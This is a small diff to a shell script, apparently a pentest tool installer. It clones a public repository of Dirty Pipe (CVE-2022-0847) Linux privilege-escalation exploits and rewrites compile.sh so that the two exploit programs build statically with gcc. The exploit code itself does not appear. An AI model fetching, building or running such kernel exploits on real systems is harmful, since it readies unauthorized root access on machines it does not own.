@@ -99,8 +99,13 @@ mkdir dirtyPipe
 cd dirtyPipe
 git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
 cd CVE-2022-0847-DirtyPipe-Exploits
-./compile.sh
+echo '
+#!/bin/bash
 
+gcc exploit-1.c -o exploit-1 --static
+gcc exploit-2.c -o exploit-2 --static
+' > ./compile.sh
+./compile.sh
 
 ##############################################################################################
 
